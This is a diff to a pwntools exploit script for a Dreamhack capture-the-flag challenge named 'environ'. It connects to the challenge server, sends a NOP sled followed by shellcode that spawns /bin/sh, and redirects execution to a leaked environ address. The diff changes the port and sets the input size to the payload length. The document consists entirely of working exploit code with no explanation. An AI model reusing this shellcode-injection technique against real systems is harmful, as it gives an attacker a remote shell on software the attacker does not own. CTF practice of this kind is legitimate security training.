@@ -1,9 +1,8 @@
 from pwn import *
-context.arch = 'x86_64'
 context.log_level='debug'
 
 hosts = 'host1.dreamhack.games'
-port = 10524
+port = 22077
 
 p = remote(hosts,port)
 #p = process('./environ',env={'LD_PRELOAD':'./libc.so.6'})
@@ -29,7 +28,7 @@ shellcode = b'\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x
 payload = b'\x90'*0x118
 payload += shellcode
 
-p.sendlineafter('Size: ','1000')
+p.sendlineafter('Size: ',str(len(payload)))
 p.sendlineafter('Data: ',payload)
 p.sendlineafter('*jmp=',str(environ_addr))
 
